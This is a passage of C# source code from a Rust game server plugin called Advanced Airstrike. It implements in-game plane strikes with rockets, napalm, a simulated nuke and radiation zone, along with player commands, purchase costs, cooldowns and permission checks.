                    if (rocketOptions.Mixed && UnityEngine.Random.Range(1, rocketOptions.FireChance) == 1)
                        rocketType = fireRocket;
                }
               
                float accuracy = GetComponent<SpectrePlane>() ? rocketOptions.SpectreAccuracy : GetComponent<NukePlane>() ? 0.5f : rocketOptions.Accuracy;
                Vector3 launchPos = entity.transform.position;
                Vector3 newTarget = Quaternion.Euler(GetRandom(accuracy), GetRandom(accuracy), GetRandom(accuracy)) * targetPos;

                Effect.server.Run("assets/prefabs/npc/m2bradley/effects/maincannonattack.prefab", entity, 0u, Vector3.zero, Vector3.zero, null, false);
                BaseEntity rocket = GameManager.server.CreateEntity(rocketType, launchPos, new Quaternion(), true);
                
                TimedExplosive rocketExplosion = rocket.GetComponent<TimedExplosive>();
                ServerProjectile rocketProjectile = rocket.GetComponent<ServerProjectile>();

                rocketProjectile.speed = rocketOptions.Speed;
                rocketProjectile.gravityModifier = 0;
                rocketExplosion.timerAmountMin = 60;
                rocketExplosion.timerAmountMax = 60;

                for (int i = 0; i < rocketExplosion.damageTypes.Count; i++)
                    rocketExplosion.damageTypes[i].amount *= rocketOptions.Damage;

                Vector3 newDirection = (newTarget - launchPos);

                rocket.SendMessage("InitializeVelocity", newDirection);
                rocket.Spawn();
               
                return rocket;
            }

            internal void FireGun()
            {
                if (projectilesFiredGun >= gunOptions.Amount)
                {
                    if (fireType == FireType.Bullet || (fireType == FireType.Combined && !InvokeHandler.IsInvoking(this, LaunchRocket)))
                        OnAmmunitionDepleted();
                    InvokeHandler.CancelInvoke(this, FireGun);
                    return;
                }

                ++projectilesFiredGun;

                UpdateFacingToTarget();

                Vector3 centerMuzzle = autoTurret.GetCenterMuzzle().transform.position;
                Vector3 modifiedAimConeDir = AimConeUtil.GetModifiedAimConeDirection(gunOptions.Accuracy * 0.2f, targetPos - centerMuzzle, true);
                Vector3 newTargetPosition = centerMuzzle + (modifiedAimConeDir * 400f);
                
                List<RaycastHit> list = Pool.GetList<RaycastHit>();
                GamePhysics.TraceAll(new Ray(centerMuzzle, modifiedAimConeDir), 0f, list, 400f, 1219701521, QueryTriggerInteraction.UseGlobal);
                for (int i = 0; i < list.Count; i++)
                {
                    RaycastHit hit = list[i];
                    BaseEntity entity = hit.GetEntity();
                    if ((!(entity != null) || (!(entity == this) && !entity.EqualNetID(autoTurret))) && (!(entity != null) || !(entity.GetComponent<BasePlayer>() != null)))
                    {
                        BaseCombatEntity baseCombatEntity = entity as BaseCombatEntity;
                        if (baseCombatEntity != null)
                        {
                            HitInfo info = new HitInfo(autoTurret, entity, DamageType.Bullet, gunOptions.Damage, hit.point);
                            entity.OnAttacked(info);
                            if (entity is BasePlayer || entity is BaseNpc)
                            {
                                Effect.server.ImpactEffect(new HitInfo
                                {
                                    HitPositionWorld = hit.point,
                                    HitNormalWorld = -modifiedAimConeDir,
                                    HitMaterial = StringPool.Get("Flesh")
                                });
                            }                            
                        }
                        if (!(entity != null) || entity.ShouldBlockProjectiles())
                        {
                            newTargetPosition = hit.point;
                            break;
                        }
                        else newTargetPosition = hit.point;
                    }
                }

                if (gunOptions.IsExplosive)
                {
                    DamageUtil.RadiusDamage(autoTurret, null, newTargetPosition, 0.5f, 0.5f, new List<DamageTypeEntry> { new DamageTypeEntry { amount = 5f, type = DamageType.Explosion } }, layerMaskExpl, false);
                    Effect.server.Run(bulletExp, newTargetPosition);
                }

                autoTurret.ClientRPC(null, "CLIENT_FireGun", StringPool.Get(autoTurret.muzzlePos.gameObject.name), newTargetPosition);

                Pool.FreeList(ref list);
            }

            private void UpdateFacingToTarget()
            {
                Vector3 a = targetPos;
                Vector3 b = autoTurret.gun_pitch.transform.InverseTransformPoint(autoTurret.muzzlePos.transform.position);
                b.z = (b.x = 0f);
                Vector3 vector = a - (autoTurret.gun_pitch.position + b);
                autoTurret.aimDir = vector;
                autoTurret.UpdateAiming();
            }

            internal float GetRandom(float accuracy) => UnityEngine.Random.Range(-accuracy * 0.2f, accuracy * 0.2f);
        }
        #endregion

        #region Rockets and Radiation
        private class RocketMonitor : MonoBehaviour
        {
            StrikeType type;
            public void SetType(StrikeType type)
            {
                this.type = type;
            }

            private void OnDestroy()
            {
                if (type == StrikeType.Napalm)
                {
                    SpawnFireball(transform.position);
                }
                if (type == StrikeType.Nuke)
                {
                    new NukeExplosion(transform.position);
                    InitializeZone(transform.position);
                }
            }

            FireBall SpawnFireball(Vector3 position)
            {
                FireBall fireBall = GameManager.server.CreateEntity(fireball, position, new Quaternion(), true) as FireBall;
                if (fireBall)
                {
                    fireBall.GetComponent<Rigidbody>().isKinematic = true;
                    fireBall.GetComponent<Collider>().enabled = false;                    
                    fireBall.Spawn();
                    fireBall.CancelInvoke("Extinguish");
                    fireBall.Invoke("Extinguish", ins.configData.Rocket.FireLife);
                    return fireBall;
                }
                return null;
            }      
            
            private void InitializeZone(Vector3 location)
            {
                if (!ConVar.Server.radiation)
                    ConVar.Server.radiation = true;
                RadiationZone newZone = new GameObject("RadiationZone").AddComponent<RadiationZone>();
                newZone.transform.position = location;
                newZone.Activate(ins.configData.Rocket.RadRadius, ins.configData.Rocket.RadIntensity);

                RadiationEntry listEntry = new RadiationEntry { zone = newZone };
                listEntry.time = ins.timer.Once(ins.configData.Rocket.RadDuration, () => ins.DestroyZone(listEntry));

                ins.radiationZones.Add(listEntry);

                if (ins.configData.Rocket.NukeAmount > 0)
                {
                    float radius = ins.configData.Rocket.NukeRadius;
                                        
                    List<BaseCombatEntity> entities = Pool.GetList<BaseCombatEntity>();
                    Vis.Entities<BaseCombatEntity>(location, radius, entities);

                    if (entities.Count > 0)
                    {
                        for (int i = entities.Count - 1; i >= 0; i--)
                        {
                            BaseCombatEntity entity = entities[i];
                            if (entity == null)
                                continue;
                            
                            float distance = Vector3.Distance(location, entity.transform.position);
                            entity.Hurt(ins.configData.Rocket.NukeAmount * (1 - (distance / radius)), DamageType.Explosion, null);
                        }
                    }
                    Pool.FreeList(ref entities);
                }
            }
        }

        public class NukeExplosion
        {
            private int count;
            private Vector3 position;

            private List<KeyValuePair<int, int>> blastRadius = new List<KeyValuePair<int, int>>
            {
                new KeyValuePair<int, int> (25, 18),
                new KeyValuePair<int, int> (15, 12),
                new KeyValuePair<int, int> (10, 10),
                new KeyValuePair<int, int> (5, 5),
                new KeyValuePair<int, int> (5, 5),
                new KeyValuePair<int, int> (5, 5),
                new KeyValuePair<int, int> (5, 5),
                new KeyValuePair<int, int> (5, 5),
                new KeyValuePair<int, int> (5, 5),
                new KeyValuePair<int, int> (10, 10),
                new KeyValuePair<int, int> (25, 18),
                new KeyValuePair<int, int> (25, 18),
                new KeyValuePair<int, int> (20, 16),
                new KeyValuePair<int, int> (20, 16)
            };

            public NukeExplosion() { }
            public NukeExplosion(Vector3 position)
            {
                this.position = position;
                BeginExplosion();
            }

            private void BeginExplosion()
            {
                Effect.server.Run(heliExplosion, position, Vector3.up, null, true);
                Next();
            }
            private void Next() => ServerMgr.Instance.StartCoroutine(CreateRing());
            IEnumerator CreateRing()
            {
                if (count == blastRadius.Count - 1)
                    yield break;
                yield return new WaitForSeconds(0.1f);
                ExplosionRing(position + ((Vector3.up * 3) * count), blastRadius[count].Key, blastRadius[count].Value);
                ++count;
                Next();
            }
            private void ExplosionRing(Vector3 position, float radius, int amount)
            {                
                int angle = 360 / amount;
                for (int i = 0; i < amount; i++)
                {
                    int a = i * angle;
                    Vector3 pos = RandomCircle(position, radius, a);
                    Effect.server.Run(c4Explosion, pos, Vector3.up, null, true);
                }
            }
            private Vector3 RandomCircle(Vector3 center, float radius, int angle)
            {
                Vector3 pos;
                pos.x = center.x + radius * Mathf.Sin(angle * Mathf.Deg2Rad);
                pos.z = center.z + radius * Mathf.Cos(angle * Mathf.Deg2Rad);
                pos.y = center.y;
                return pos;
            }
        }
        public class RadiationEntry
        {
            public RadiationZone zone;
            public Timer time;
        }
        public class RadiationZone : MonoBehaviour
        {
            SphereCollider collider;

            private void Awake()
            {
                gameObject.layer = (int)Layer.Reserved1;

                Rigidbody rigidbody = gameObject.AddComponent<Rigidbody>();
                rigidbody.useGravity = false;
                rigidbody.isKinematic = true;
                rigidbody.detectCollisions = true;
                rigidbody.collisionDetectionMode = CollisionDetectionMode.Discrete;

                collider = gameObject.AddComponent<SphereCollider>();
                collider.isTrigger = true;
            }

            public void Activate(float radius, float amount)
            {
                collider.radius = radius;

                TriggerRadiation radiation = gameObject.AddComponent<TriggerRadiation>();
                radiation.RadiationAmountOverride = amount;
                radiation.interestLayers = LayerMask.GetMask("Player (Server)");
                radiation.enabled = true;
            }

            private void OnDestroy()
            {
                Destroy(gameObject);
            }
        }

        private void DestroyZone(RadiationEntry zone)
        {
            if (radiationZones.Contains(zone))
            {
                var index = radiationZones.FindIndex(a => a.zone == zone.zone);
                radiationZones[index].time.Destroy();
                UnityEngine.Object.Destroy(radiationZones[index].zone);
                radiationZones.Remove(zone);
            }
        }
        #endregion

        #region Functions
        private void SendStrike(BasePlayer player, StrikeType type, Vector3 position, string targetName = "")
        {
            switch (type)
            {
                case StrikeType.Strike:
                    CallStrike(position, player.displayName);
                    SendReply(player, string.IsNullOrEmpty(targetName) ? string.Format(msg("strikeConfirmed", player.UserIDString), position) : string.Format(msg("strikePlayer", player.UserIDString), targetName));
                    break;
                case StrikeType.Squad:
                    CallSquad(position, player.displayName);
                    SendReply(player, string.IsNullOrEmpty(targetName) ? string.Format(msg("squadConfirmed", player.UserIDString), position) : string.Format(msg("squadPlayer", player.UserIDString), targetName));
                    break;
                case StrikeType.Napalm:
                    CallNapalm(position, player.displayName);
                    SendReply(player, string.IsNullOrEmpty(targetName) ? string.Format(msg("napalmConfirmed", player.UserIDString), position) : string.Format(msg("napalmPlayer", player.UserIDString), targetName));
                    break;
                case StrikeType.Nuke:
                    CallNuke(position, player.displayName);
                    SendReply(player, string.IsNullOrEmpty(targetName) ? string.Format(msg("nukeConfirmed", player.UserIDString), position) : string.Format(msg("nukePlayer", player.UserIDString), targetName));
                    break;
                case StrikeType.Spectre:
                    CallSpectre(position, player.displayName);
                    SendReply(player, string.IsNullOrEmpty(targetName) ? string.Format(msg("spectreConfirmed", player.UserIDString), position) : string.Format(msg("spectrePlayer", player.UserIDString), targetName));
                    break;
                default: return;
            }
        }

        private void PrepareRandomStrikes()
        {
            if (configData.Other.RandomStrikes.Count == 0) return;
            foreach (var type in configData.Other.RandomStrikes)
                availableTypes.Add(ParseType<StrikeType>(type));
            CallRandomStrike();
        }
        private void CallRandomStrike()
        {   
            timer.In(UnityEngine.Random.Range(configData.Other.RandomTimer[0], configData.Other.RandomTimer[1]), () =>
            {
                StrikeType type = availableTypes.GetRandom();               
                Vector3 position = GetRandomPosition();

                if (!string.IsNullOrEmpty(configData.Other.RandomStrikeLocations) && Spawns)
                {
                    object success = Spawns.Call("GetRandomSpawn", configData.Other.RandomStrikeLocations);
                    if (success is string)
                        PrintError($"Unable to retrieve a position from the designated spawnfile. Error: {(string)success}");
                    else position = (Vector3)success;
                }

                switch (type)
                {
                    case StrikeType.Strike:
                        CallStrike(position, string.Empty);
                        break;
                    case StrikeType.Squad:
                        CallSquad(position, string.Empty);
                        break;
                    case StrikeType.Napalm:
                        CallNapalm(position, string.Empty);
                        break;
                    case StrikeType.Nuke:
                        CallNuke(position, string.Empty);
                        break;
                    case StrikeType.Spectre:
                        CallSpectre(position, string.Empty);
                        break;
                    default: break;
                }                

                CallRandomStrike();
            });
        }
        private void CallStrike(Vector3 position, string ownerName)
        {
            CargoPlane entity = CreatePlane();
            entity.Spawn();

            BasePlane plane = entity.gameObject.AddComponent<BasePlane>();
            plane.InitializeFlightPath(position, StrikeType.Strike);

            if (configData.Other.Broadcast)
            {
                if (configData.Other.BroadcastNames && !string.IsNullOrEmpty(ownerName))
                    PrintToChat(string.Format(msg("strikeInboundName"), ownerName));
                else PrintToChat(msg("strikeInbound"));
            }
        }
        private void CallSquad(Vector3 position, string ownerName)
        {
            CargoPlane leaderEnt = CreatePlane();
            leaderEnt.Spawn();

            BasePlane leaderPlane = leaderEnt.gameObject.AddComponent<BasePlane>();
            leaderPlane.InitializeFlightPath(position, StrikeType.Squad);

            Vector3 startPos;
            Vector3 endPos;
            float secondsToTake;
            leaderPlane.GetFlightData(out startPos, out endPos, out secondsToTake);

            CargoPlane leftEnt = CreatePlane();
            leftEnt.Spawn();
            BasePlane leftPlane = leftEnt.gameObject.AddComponent<BasePlane>();
            Vector3 leftOffset = (leaderEnt.transform.right * 70) + (-leaderEnt.transform.forward * 80);
            leftPlane.SetFlightData(startPos + leftOffset, endPos + leftOffset, position + (leftOffset / 4), secondsToTake);

            CargoPlane rightEnt = CreatePlane();
            rightEnt.Spawn();
            BasePlane rightPlane = rightEnt.gameObject.AddComponent<BasePlane>();
            Vector3 rightOffset = (-leaderEnt.transform.right * 70) + (-leaderEnt.transform.forward * 80);
            rightPlane.SetFlightData(startPos + rightOffset, endPos + rightOffset, position + (rightOffset / 4), secondsToTake);

            if (configData.Other.Broadcast)
            {
                if (configData.Other.BroadcastNames && !string.IsNullOrEmpty(ownerName))
                    PrintToChat(string.Format(msg("squadInboundName"), ownerName));
                else PrintToChat(msg("squadInbound"));
            }
        }
        private void CallNuke(Vector3 position, string ownerName)
        {
            CargoPlane entity = CreatePlane();
            entity.Spawn();

            NukePlane plane = entity.gameObject.AddComponent<NukePlane>();
            plane.InitializeFlightPath(position, StrikeType.Nuke);

            if (configData.Other.Broadcast)
            {
                if (configData.Other.BroadcastNames && !string.IsNullOrEmpty(ownerName))
                    PrintToChat(string.Format(msg("nukeInboundName"), ownerName));
                else PrintToChat(msg("nukeInbound"));
            }
        }
        private void CallNapalm(Vector3 position, string ownerName)
        {
            CargoPlane entity = CreatePlane();
            entity.Spawn();

            NapalmPlane plane = entity.gameObject.AddComponent<NapalmPlane>();
            plane.InitializeFlightPath(position, StrikeType.Napalm);

            if (configData.Other.Broadcast)
            {
                if (configData.Other.BroadcastNames && !string.IsNullOrEmpty(ownerName))
                    PrintToChat(string.Format(msg("napalmInboundName"), ownerName));
                else PrintToChat(msg("napalmInbound"));
            }
        }
        private void CallSpectre(Vector3 position, string ownerName)
        {
            CargoPlane entity = CreatePlane();
            entity.Spawn();

            SpectrePlane plane = entity.gameObject.AddComponent<SpectrePlane>();
            plane.InitializeFlightPath(position, StrikeType.Spectre);

            if (configData.Other.Broadcast)
            {
                if (configData.Other.BroadcastNames && !string.IsNullOrEmpty(ownerName))
                    PrintToChat(string.Format(msg("spectreInboundName"), ownerName));
                else PrintToChat(msg("spectreInbound"));
            }
        }

        private bool CanBuyStrike(BasePlayer player, StrikeType type)
        {
            Dictionary<string, int> costToBuy = null;
            switch (type)
            {
                case StrikeType.None:
                    return false;
                case StrikeType.Strike:
                    costToBuy = configData.Buy.StrikeCost;
                    break;
                case StrikeType.Squad:
                    costToBuy = configData.Buy.SquadCost;
                    break;
                case StrikeType.Napalm:
                    costToBuy = configData.Buy.NapalmCost;
                    break;
                case StrikeType.Nuke:
                    costToBuy = configData.Buy.NukeCost;
                    break;
                case StrikeType.Spectre:
                    costToBuy = configData.Buy.SpectreCost;
                    break;               
            }

            foreach (var item in costToBuy)
            {
                if (item.Key == "RP")
                {
                    if (ServerRewards)
                    {
                        if ((int)ServerRewards.Call("CheckPoints", player.userID) < item.Value)
                        {
                            SendReply(player, string.Format(msg("buyItem", player.UserIDString), item.Value, item.Key));
                            Effect.server.Run("assets/prefabs/locks/keypad/effects/lock.code.denied.prefab", player.transform.position);
                            return false;
                        }
                    }
                }
                if (item.Key == "Economics")
                {
                    if (Economics)
                    {
                        if ((double)Economics.Call("Balance", player.userID) < item.Value)
                        {
                            SendReply(player, string.Format(msg("buyItem", player.UserIDString), item.Value, item.Key));
                            Effect.server.Run("assets/prefabs/locks/keypad/effects/lock.code.denied.prefab", player.transform.position);
                            return false;
                        }
                    }
                }
                if (shortnameToId.ContainsKey(item.Key))
                {
                    if (player.inventory.GetAmount(shortnameToId[item.Key]) < item.Value)
                    {
                        SendReply(player, string.Format(msg("buyItem", player.UserIDString), item.Value, shortnameToDn[item.Key]));
                        Effect.server.Run("assets/prefabs/locks/keypad/effects/lock.code.denied.prefab", player.transform.position);
                        return false;
                    }
                }
            }
            Effect.server.Run("assets/prefabs/locks/keypad/effects/lock.code.updated.prefab", player.transform.position);
            return true;
        }

        private void BuyStrike(BasePlayer player, StrikeType type, Vector3 targetPosition, string targetName = "")
        {
            Dictionary<string, int> costToBuy = null;
            switch (type)
            {
                case StrikeType.None:
                    return;
                case StrikeType.Strike:
                    costToBuy = configData.Buy.StrikeCost;
                    break;
                case StrikeType.Squad:
                    costToBuy = configData.Buy.SquadCost;
                    break;
                case StrikeType.Napalm:
                    costToBuy = configData.Buy.NapalmCost;
                    break;
                case StrikeType.Nuke:
                    costToBuy = configData.Buy.NukeCost;
                    break;
                case StrikeType.Spectre:
                    costToBuy = configData.Buy.SpectreCost;
                    break;
            }

            foreach (var item in costToBuy)
            {
                if (item.Key == "RP")
                {
                    if (ServerRewards)
                        ServerRewards.Call("TakePoints", player.userID, item.Value);
                }
                if (item.Key == "Economics")
                {
                    if (Economics)
                        Economics.Call("Withdraw", player.userID, (double)item.Value);
                }
                if (shortnameToId.ContainsKey(item.Key))
                    player.inventory.Take(null, shortnameToId[item.Key], item.Value);
            }
            SendStrike(player, type, targetPosition, targetName);
        }
        #endregion

        #region NoEscape
        private bool CanCallStrike(BasePlayer player)
        {
            if (player.IsAdmin)
                return true;

            if (NoEscape)
            {
                if (configData.Other.FromRB)
                {
                    bool success = NoEscape.Call<bool>("IsRaidBlocked", player);
                    if (success)
                    {
                        SendReply(player, msg("playerRaidBlocked", player.UserIDString));
                        return false;
                    }
                }
                if (configData.Other.FromCB)
                {
                    bool success = NoEscape.Call<bool>("IsCombatBlocked", player);
                    if (success)
                    {
                        SendReply(player, msg("playerCombatBlocked", player.UserIDString));
                        return false;
                    }
                }
            }
            return true;
        }

        private bool CanStrikeTarget(BasePlayer player, BasePlayer target)
        {
            if (player.IsAdmin)
                return true;

            if (NoEscape)
            {
                if (configData.Other.AgainstRB)
                {
                    bool success = NoEscape.Call<bool>("IsRaidBlocked", target);
                    if (success)
                    {
                        SendReply(player, msg("targetRaidBlocked", player.UserIDString));
                        return false;
                    }
                }
                if (configData.Other.AgainstCB)
                {
                    bool success = NoEscape.Call<bool>("IsCombatBlocked", target);
                    if (success)
                    {
                        SendReply(player, msg("targetCombatBlocked", player.UserIDString));
                        return false;
                    }
                }
            }
            return true;
        }
        #endregion

        #region Helpers
        private double GrabCurrentTime() => DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1, 0, 0, 0)).TotalSeconds;
        private CargoPlane CreatePlane() => (CargoPlane)GameManager.server.CreateEntity(cargoPlanePrefab, new Vector3(), new Quaternion(), true);
        private bool isStrikePlane(CargoPlane plane) => plane.GetComponent<BasePlane>();
        private bool isStrikeSignal(BaseEntity entity) => strikeSignals.Contains(entity);
        private bool HasPermission(BasePlayer player, string perm) => permission.UserHasPermission(player.UserIDString, perm);

        private Vector3 GetRandomPosition()
        {
            float mapSize = (TerrainMeta.Size.x / 2) - 600f;

            float randomX = UnityEngine.Random.Range(-mapSize, mapSize);
            float randomY = UnityEngine.Random.Range(-mapSize, mapSize);

            return new Vector3(randomX, 0f, randomY);
        }

        private string FormatTime(double time)
        {
            TimeSpan dateDifference = TimeSpan.FromSeconds((float)time);
            var days = dateDifference.Days;
            var hours = dateDifference.Hours;
            hours += (days * 24);
            var mins = dateDifference.Minutes;
            var secs = dateDifference.Seconds;
            return string.Format("{0:00}:{1:00}:{2:00}", hours, mins, secs);
        }

        private void AddCooldownData(BasePlayer player, StrikeType type)
        {
            if (!configData.Cooldown.Enabled) return;

            if (!storedData.cooldowns.ContainsKey(player.userID))
                storedData.cooldowns.Add(player.userID, new CooldownData());

            if (configData.Cooldown.Combine)
                storedData.cooldowns[player.userID].globalCd = GrabCurrentTime() + configData.Cooldown.Time;
            else
            {
                switch (type)
                {
                    case StrikeType.None:
                        return;
                    case StrikeType.Strike:
                        storedData.cooldowns[player.userID].strikeCd = GrabCurrentTime() + configData.Cooldown.Times[type.ToString()];
                        return;
                    case StrikeType.Squad:
                        storedData.cooldowns[player.userID].squadCd = GrabCurrentTime() + configData.Cooldown.Times[type.ToString()];
                        return;
                    case StrikeType.Napalm:
                        storedData.cooldowns[player.userID].napalmCd = GrabCurrentTime() + configData.Cooldown.Times[type.ToString()];
                        return;
                    case StrikeType.Nuke:
                        storedData.cooldowns[player.userID].nukeCd = GrabCurrentTime() + configData.Cooldown.Times[type.ToString()];
                        return;
                    case StrikeType.Spectre:
                        storedData.cooldowns[player.userID].spectreCd = GrabCurrentTime() + configData.Cooldown.Times[type.ToString()];
                        return;
                }
            }            
        }

        private List<BasePlayer> FindPlayer(string arg)
        {
            List<BasePlayer> foundPlayers = new List<BasePlayer>();

            ulong steamid;
            ulong.TryParse(arg, out steamid);

            foreach (BasePlayer player in BasePlayer.activePlayerList)
            {
                if (steamid != 0L)
                {
                    if (player.userID == steamid)
                    {
                        foundPlayers.Clear();
                        foundPlayers.Add(player);
                        return foundPlayers;
                    }
                }
                if (player.displayName.ToLower().Contains(arg.ToLower()))                
                    foundPlayers.Add(player);                
            }
            return foundPlayers;
        }

        private T ParseType<T>(string type)
        {
            try
            {
                return (T)Enum.Parse(typeof(T), type, true);
            }
            catch
            {
                PrintError($"INVALID OPTION! The value \"{type}\" is an incorrect selection.\nAvailable options are: {Enum.GetNames(typeof(T)).ToSentence()}");
                return default(T);
            }
        }
        #endregion

        #region Commands
        [ChatCommand("strike")]
        void cmdAirstrike(BasePlayer player, string command, string[] args)
        {
            if (args.Length == 0)
            {
                SendReply(player, string.Format("<color=#ce422b>Advanced Airstrike  </color><color=#939393>v.</color><color=#ce422b>{0} </color><color=#939393>-- </color><color=#ce422b>k1lly0u @ chaoscode.io</color>", Version));
                SendReply(player, msg("help1", player.UserIDString));
                SendReply(player, msg("help2", player.UserIDString));
                SendReply(player, msg("help6", player.UserIDString));
                if (player.IsAdmin || configData.Other.AllowCoords)
                    SendReply(player, msg("help7", player.UserIDString));
                SendReply(player, msg("help3", player.UserIDString));
                SendReply(player, msg("help4", player.UserIDString));
                if (player.IsAdmin || configData.Other.AllowCoords)
                    SendReply(player, msg("help5", player.UserIDString));
                return;
            }
            if (args.Length >= 2)
            {
                var time = GrabCurrentTime();
                StrikeType type = ParseType<StrikeType>(args[1]);
                if (type == StrikeType.None)
                {
                    SendReply(player, msg("invalidType", player.UserIDString));
                    return;
                }

                if (!HasPermission(player, "advairstrike.ignorecooldown"))
                {
                    if (configData.Cooldown.Enabled)
                    {
                        CooldownData data;
                        if (storedData.cooldowns.TryGetValue(player.userID, out data))
                        {
                            double nextUse = configData.Cooldown.Combine ? data.globalCd : type == StrikeType.Strike ? data.strikeCd : type == StrikeType.Squad ? data.squadCd : type == StrikeType.Napalm ? data.napalmCd : type == StrikeType.Nuke ? data.nukeCd : data.spectreCd;
                            if (nextUse > time)
                            {
                                double remaining = nextUse - time;
                                SendReply(player, string.Format(msg("onCooldown", player.UserIDString), FormatTime(remaining)));
                                return;
                            }
                        }
                    }
                }

                if (!CanCallStrike(player))
                    return;

                switch (args[0].ToLower())
                {
                    case "signal":
                        if ((type == StrikeType.Strike && configData.Other.SignalStrike) || (type == StrikeType.Squad && configData.Other.SignalSquad) || (type == StrikeType.Napalm && configData.Other.SignalNapalm) || (type == StrikeType.Nuke && configData.Other.SignalNuke) || (type == StrikeType.Spectre && configData.Other.SignalSpectre))
                        {
                            if (!HasPermission(player, $"advairstrike.signal.{type.ToString().ToLower()}"))
                            {
                                SendReply(player, msg("noPerms", player.UserIDString));
                                return;
                            }

                            if (toggleList.ContainsKey(player.userID))
                                toggleList[player.userID] = type;
                            else toggleList.Add(player.userID, type);
                            SendReply(player, msg("signalReady", player.UserIDString));
                        }
                        else SendReply(player, msg("typeDisabledSignal", player.UserIDString));
                        return;
                    case "buy":
                        if ((type == StrikeType.Strike && configData.Buy.PermissionStrike) || (type == StrikeType.Squad && configData.Buy.PermissionSquad) || (type == StrikeType.Napalm && configData.Buy.PermissionNapalm) || (type == StrikeType.Nuke && configData.Buy.PermissionNuke) || (type == StrikeType.Spectre && configData.Buy.PermissionSpectre))
                        {
                            if (!HasPermission(player, $"advairstrike.purchase.{type.ToString().ToLower()}"))
                            {
                                SendReply(player, msg("noPerms", player.UserIDString));
                                return;
                            }

                            if (CanBuyStrike(player, type))
                            {
                                Vector3 position = new Vector3();
                                string targetName = string.Empty;
                                if (args.Length == 4)
                                {
                                    if (player.IsAdmin || configData.Other.AllowCoords)
                                    {
                                        float x, z;
                                        if (!float.TryParse(args[2], out x) || !float.TryParse(args[3], out z))
                                        {
                                            SendReply(player, msg("invCoords", player.UserIDString));
                                            return;
                                        }
                                        else
                                        {
                                            position = new Vector3(x, 0, z);
                                            position.y = TerrainMeta.HeightMap.GetHeight(position);
                                        }
                                    }
                                    else
                                    {
                                        SendReply(player, msg("invalidSyntax", player.UserIDString));
                                        return;
                                    }
                                }
                                else if (args.Length == 3)
                                {
                                    var players = FindPlayer(args[2]);
                                    if (players.Count > 1)
                                    {
                                        SendReply(player, msg("multiplePlayers", player.UserIDString));
                                        return;
                                    }
                                    else if (players.Count == 0)
                                    {
                                        SendReply(player, msg("noPlayers", player.UserIDString));
                                        return;
                                    }
                                    else
                                    {
                                        BasePlayer targetPlayer = players[0];

                                        if (!CanStrikeTarget(player, targetPlayer))
                                            return;

                                        if (configData.Cooldown.PlayerTime > 0)
                                        {
                                            if (playerCooldowns.ContainsKey(targetPlayer.userID))
                                            {
                                                if (time < playerCooldowns[targetPlayer.userID])
                                                {
                                                    SendReply(player, msg("playerCooldown", player.UserIDString));
                                                    return;
                                                }
                                            }
                                            playerCooldowns[targetPlayer.userID] = time + configData.Cooldown.PlayerTime;
                                        }
                                        position = players[0].transform.position;
                                        targetName = targetPlayer.displayName;
                                    }
                                }
                                else position = player.transform.position;

                                BuyStrike(player, type, position, targetName);
                                AddCooldownData(player, type);
                            }
                        }
                        else SendReply(player, msg("typeDisabledBuy", player.UserIDString));
                        return;
                    case "call":
                        if (HasPermission(player, $"advairstrike.chat.{type.ToString().ToLower()}"))
                        {
                            Vector3 position = new Vector3();
                            string targetName = string.Empty;
                            if (args.Length == 4)
                            {
                                if (player.IsAdmin || configData.Other.AllowCoords)
                                {
                                    float x, z;
                                    if (!float.TryParse(args[2], out x) || !float.TryParse(args[3], out z))
                                    {
                                        SendReply(player, msg("invCoords", player.UserIDString));
                                        return;
                                    }
                                    else position = new Vector3(x, 0, z);
                                }
                                else
                                {
                                    SendReply(player, msg("invalidSyntax", player.UserIDString));
                                    return;
                                }
                            }
                            else if (args.Length == 3)
                            {
                                List<BasePlayer> players = FindPlayer(args[2]);
                                if (players.Count > 1)
                                {
                                    SendReply(player, msg("multiplePlayers", player.UserIDString));
                                    return;
                                }
                                else if (players.Count == 0)
                                {
                                    SendReply(player, msg("noPlayers", player.UserIDString));
                                    return;
                                }
                                else
                                {
                                    BasePlayer targetPlayer = players[0];

                                    if (!CanStrikeTarget(player, targetPlayer))
                                        return;

                                    if (configData.Cooldown.PlayerTime > 0)
                                    {
                                        if (playerCooldowns.ContainsKey(targetPlayer.userID))
                                        {
                                            if (time < playerCooldowns[targetPlayer.userID])
                                            {
                                                SendReply(player, msg("playerCooldown", player.UserIDString));
                                                return;
                                            }
                                        }
                                        playerCooldowns[targetPlayer.userID] = time + configData.Cooldown.PlayerTime;
                                    }
                                    position = players[0].transform.position;
                                    targetName = targetPlayer.displayName;
                                }
                            }
                            else if (args.Length == 2)
                            {
                                position = player.transform.position;
                            }
                            else
                            {
                                SendReply(player, msg("invalidSyntax", player.UserIDString));
                                return;
                            }

                            SendStrike(player, type, position, targetName);
                            AddCooldownData(player, type);
                        }
                        else SendReply(player, msg("noPerms", player.UserIDString));
                        return;
                    default:
                        break;
                }
            }
        }     

        [ConsoleCommand("strike")]
        void ccmdAirstrike(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null)
                return;
            if (arg.Args == null || arg.Args.Length == 0)
            {
                SendReply(arg, "strike <strike|squad|napalm|nuke|spectre> <x> <z> - Call the specified airstrike type to the target position");
                SendReply(arg, "strike <strike|squad|napalm|nuke|spectre> <playername> - Call the specified airstrike type to the target player");
                SendReply(arg, "strike <strike|squad|napalm|nuke|spectre> random - Call a random airstrike of the specified type");
                return;
            }

            StrikeType type = ParseType<StrikeType>(arg.Args[0]);
            if (type == StrikeType.None)
            {
                SendReply(arg, msg("invalidType"));
                return;
            }

            Vector3 position = Vector3.zero;

            if (arg.Args[1].ToLower() == "random")
                position = GetRandomPosition();
            else if (arg.Args.Length == 3)
            {
                float x, z;
                if (!float.TryParse(arg.Args[1], out x) || !float.TryParse(arg.Args[2], out z))
                {
                    SendReply(arg, "Invalid co-ordinates set. You must enter number values for X and Z");
                    return;
                }
                else position = new Vector3(x, 0, z);
            }
            else if (arg.Args.Length == 2)
            {
                var players = FindPlayer(arg.Args[1]);
                if (players.Count > 1)
                {
                    SendReply(arg, "Multiple players found");
                    return;
                }
                else if (players.Count == 0)
                {
                    SendReply(arg, "No players found");
                    return;
                }
                else position = players[0].transform.position;
            }

            switch (type)
            {
                case StrikeType.Strike:
                    CallStrike(position, string.Empty);
                    SendReply(arg, string.Format("Airstrike confirmed at co-ordinates: {0}", position));
                    break;
                case StrikeType.Squad:
                    CallSquad(position, string.Empty);
                    SendReply(arg, string.Format("Squadstrike confirmed at co-ordinates: {0}", position));
                    break;
                case StrikeType.Napalm:
                    CallNapalm(position, string.Empty);
                    SendReply(arg, string.Format("Napalm strike confirmed at co-ordinates: {0}", position));
                    break;
